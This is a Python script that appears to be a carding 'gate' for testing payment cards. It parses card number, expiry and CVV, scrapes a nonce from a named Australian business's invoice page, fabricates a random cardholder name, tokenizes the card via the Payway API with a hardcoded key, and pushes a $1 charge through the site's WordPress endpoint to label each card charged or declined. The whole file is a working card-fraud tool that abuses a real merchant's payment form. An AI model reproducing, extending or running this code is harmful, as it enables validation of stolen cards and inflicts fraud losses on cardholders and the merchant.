import asyncio
import re
import random
import logging
import json
import aiohttp


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RANDOM DATA GENERATORS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_cardholder_name():
    first_names = ['John', 'Michael', 'David', 'James', 'Robert', 'William']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Davis']
    return f"{random.choice(first_names)} {random.choice(last_names)}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN GATE FUNCTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def check_gate(card: str) -> dict:
    """
    Checks a card through Payway gateway (1$ charge).
    
    Args:
        card: Card in format cc|mm|yy|cvv
    
    Returns:
        dict with keys:
            - status: "charged", "approved", "declined", "error"
            - response: Human readable response message
    """
    try:
        card = card.strip()
        parts = card.split('|')
        if len(parts) != 4:
            return {"status": "error", "response": "Invalid card format"}
       
        card_number, expiry_month, expiry_year, cvv = parts
        expiry_year = expiry_year[-2:]
        
        # Hardcoded 1.00 amount
        amount = "1.00"
        
        base_headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 1: Get pay page and extract nonce
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            async with session.get(
                'https://www.coriowm.com.au/pay-an-invoice/', 
                headers=base_headers
            ) as resp:
                html = await resp.text()
            
            match = re.search(r'admin-ajax\.php","nonce":"([^"]+)"', html)
            if not match:
                match = re.search(r'nonce":"([^"]+)"', html)
            
            if not match:
                return {"status": "error", "response": "Failed to extract nonce"}
            
            nonce = match.group(1)
            
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 2: Create single use token
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            headers_token = {
                'authority': 'api.payway.com.au',
                'accept': 'application/json',
                'authorization': 'Basic UTE4Mzc1X1BVQl8yc3VxNmt4M3pha2JtdTR6dWQ0eDVhM2ZyZG14eXpxOGlpbnoydjZ4emN5cGs1MnR6YWFzN2dwbWp6ZWk6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'user-agent': base_headers['User-Agent'],
            }

            data_token = {
                'paymentMethod': 'creditCard',
                'connectionType': 'FRAME',
                'cardNumber': card_number,
                'cvn': cvv,
                'cardholderName': generate_cardholder_name(),
                'expiryDateMonth': expiry_month,
                'expiryDateYear': expiry_year,
                'threeDS2': 'false',
            }

            async with session.post(
                'https://api.payway.com.au/rest/v1/single-use-tokens', 
                headers=headers_token, 
                data=data_token
            ) as resp_token:
                token_resp = await resp_token.json()
                
            if 'singleUseTokenId' not in token_resp:
                # Tokenization failed = Declined
                return {"status": "declined", "response": "The payment was declined by your provider. [004]"}
                
            card_token = token_resp['singleUseTokenId']
            
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 3: Process payment
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            headers_pay = {
                'authority': 'www.coriowm.com.au',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.coriowm.com.au',
                'referer': 'https://www.coriowm.com.au/pay-an-invoice/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'user-agent': base_headers['User-Agent'],
                'x-requested-with': 'XMLHttpRequest',
            }

            data_pay = {
                'action': 'payway_process_payment',
                'nonce': nonce,
                'amount': amount,
                'description': '',
                'customer_number': '3',
                'order_number': '31',
                'card_token': card_token,
            }

            async with session.post(
                'https://www.coriowm.com.au/wp-admin/admin-ajax.php', 
                headers=headers_pay, 
                data=data_pay
            ) as response:
                response_text = await response.text()
            
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 4: Parse response
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            
            # Specific failure string check -> DECLINED
            if "Payment processing failed. Please try again." in response_text:
                return {"status": "declined", "response": "The payment was declined by your provider. [004]"}
            
            # If ANY other response is found -> CHARGED
            return {"status": "charged", "response": "Your payment has been received."}
               
    except asyncio.TimeoutError:
        logging.error("Payway Gate Error: Request timed out")
        return {"status": "error", "response": "Connection Timed Out"}
    except aiohttp.ClientError as e:
        logging.error(f"Payway Gate Error: {e}")
        return {"status": "error", "response": "Connection Error"}
    except Exception as e:
        logging.error(f"Payway Gate Error: {e}")
        return {"status": "error", "response": str(e)}
